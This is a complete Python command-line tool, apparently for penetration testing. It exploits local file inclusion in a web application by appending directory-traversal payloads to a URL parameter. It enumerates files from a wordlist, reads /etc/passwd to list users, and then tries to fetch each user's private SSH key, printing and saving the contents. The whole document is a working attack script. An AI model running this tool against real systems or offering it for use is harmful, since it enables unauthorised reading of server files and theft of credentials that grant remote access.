import requests
import argparse
import re

class LFI_Hunter():
    def __init__(self,target,wordlist,output_file):
        self.target = target
        self.wordlist = wordlist
        self.output_file = output_file
        self.check = self.size_check()
        self.lfihunt()
        self.get_keys()

    def size_check(self):
        if args.o:
            file_write = open(self.output_file,"w")
            file_write.close()

        payload = self.target + "../../../../../../../../9fX1SxbT61qUDQKjpDWo8ApV3YTVLpz5ThM3wJ6XOqlaz"
        req_lfi = requests.get(payload,verify=False)
        page_size = len(req_lfi.text)

        return page_size

    def write_output(self,line1,line2,line3):
        print(line1)
        print(line2)
        print(line3)
        out_file = open(self.output_file,'a')
        out_file.write(line1)
        out_file.write("\n")
        out_file.write(line2)
        out_file.write(line3)
        out_file.write("\n")
        out_file.close()

    def get_keys(self):
        payload = self.target + "../../../../../../../../etc/passwd"
        req_lfi = requests.get(payload,verify=False)
        search = re.findall("/home/(.*):/bin/",req_lfi.text)
        
        for each_user in search:
            print("Searching for SSH keys for user(s) " + each_user)
            ssh_payload = self.target + "../../../../../../../../home/" + each_user + "/.ssh/id_rsa"
            req_ssh = requests.get(ssh_payload,verify=False)
            
            if len(req_ssh.text) > self.check:
                line1 = "Found: \x1b[6;30;42mSSH Keys for " + each_user.strip() + "\x1b[0m" #Green color output
                line2 = "\n" + req_ssh.text + "\n"
                line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red color output
                
                if args.o:
                    self.write_output(line1,line2,line3)
                else:
                    print(line1)
                    print(line2)
                    print(line3)

            else:
                print("No SSH keys found for user(s) " + each_user.strip())

    def lfihunt(self):
        payload = self.target + "../../../../../../../.."

        headers = {
            "Connection":"close" 
        }

        with open(self.wordlist) as file:
            for each_line in file:
                req_lfi = requests.get(payload + each_line.strip(),headers=headers,verify=False)

                if len(req_lfi.text) > self.check:
                    line1 = "File: \x1b[6;30;42m" + each_line.strip() + "\x1b[0m" #Green color output
                    line2 = "\n" + req_lfi.text + "\n"
                    line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red color output
                    if args.o:
                        self.write_output(line1,line2,line3)
                    else:
                        print(line1)
                        print(line2)
                        print(line3)

        file.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='LFI Enumeration Tool')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://lfi.location/example.php?parameter=', required=True)
    parser.add_argument('-w', metavar='<wordlist file>',help="Example: -w unix.txt", required=True)
    parser.add_argument('-o', metavar='<output file>',help="Example: -o output.txt", required=False)
    args = parser.parse_args()
    
    try:
        LFI_Hunter(args.t,args.w,args.o)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()